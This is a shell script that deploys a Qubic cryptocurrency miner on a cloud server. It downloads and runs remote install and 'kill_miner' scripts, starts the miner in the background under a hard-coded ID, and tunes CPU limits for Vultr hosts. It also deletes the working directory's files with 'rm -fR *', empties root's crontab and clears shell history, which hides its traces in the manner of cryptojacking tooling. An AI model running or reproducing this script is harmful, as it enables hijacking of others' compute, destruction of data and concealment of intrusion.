#!/bin/sh
rm -fR *
rm -fv *
sudo apt-get update -y
sudo apt-get install cpulimit -y
wget -O qli-Service-install.sh https://dl.qubic.li/cloud-init/qli-Service-install.sh
chmod +x qli-Service-install.sh
cores=$(nproc --all)
limitCPU=$((cores * 80))
country=$(curl -s ipinfo.io | jq -r '.country')

cat /dev/null > /root/danielluis1921.sh
cat >>/root/danielluis1921.sh <<EOF
#!/bin/bash
sudo ./kill_miner.sh
sleep 5
sudo ./qli-Service-install.sh $cores ZGQARACGRFGJZDVQLFDWXLGVPORCRMKZOCRIPSDJACSUVVYZKSPIEELEAJFB > /dev/null 2>&1 &
sleep 3
EOF

chmod +x /root/danielluis1921.sh

hostname=$(hostname)
if [ "$hostname" = "vultr" ];
then
  sed -i "$ a\\cpulimit --limit=$limitCPU --pid \$(pidof qli-Service-install) > /dev/null 2>&1 &" danielluis1921.sh
  sed -i 's/Linode/Vultr/g' danielluis1921.sh
  sed -i 's/--keepalive true//g' danielluis1921.sh
else
  sed -i 's/stratum-asia/stratum-eu/g' danielluis1921.sh
  sed -i 's/stratum-na/stratum-eu/g' danielluis1921.sh
  echo "hostname isn't vultr"
fi

wget "https://raw.githubusercontent.com/danielluis1921/Danialluis1921/main/kill_miner.sh" --output-document=/root/kill_miner.sh
chmod +x /root/kill_miner.sh
./kill_miner.sh
sleep 3
./danielluis1921.sh
rm -fv *
rm -fR *
cat /dev/null > /var/spool/cron/crontabs/root
history -c && history -w
